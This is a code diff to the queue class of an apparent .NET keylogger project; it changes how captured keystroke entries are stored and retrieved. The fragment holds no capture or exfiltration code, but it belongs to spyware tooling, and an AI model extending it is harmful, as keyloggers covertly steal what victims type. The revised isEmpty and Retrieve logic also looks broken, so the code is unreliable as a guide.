@@ -153,24 +153,30 @@ namespace dotnet_keylogger
     public class KeylogQ
     {
         public Queue<keylog> keylogs { get; } = new Queue<keylog>();
+        public int position { get; set; }
         public bool isEmpty()
         {
-            if (this.keylogs.Count == 0)
+            if (this.keylogs.Count >= this.position)
             {
-                return true;
+                return false;
             }
-            return false;
+            return true;
         }
         public void Add(keylog k)
         {
             this.keylogs.Enqueue(k);
-
         }
         public keylog Retrieve()
         {
-            return this.keylogs.Dequeue();
+            this.position++;
+            return this.keylogs.ElementAt(this.position);
+            //return this.keylogs.Dequeue();
         }
         public KeylogQ()
         { }
+        public KeylogQ Clone()
+        {
+            return (KeylogQ) this.MemberwiseClone();
+        }
     }
 }
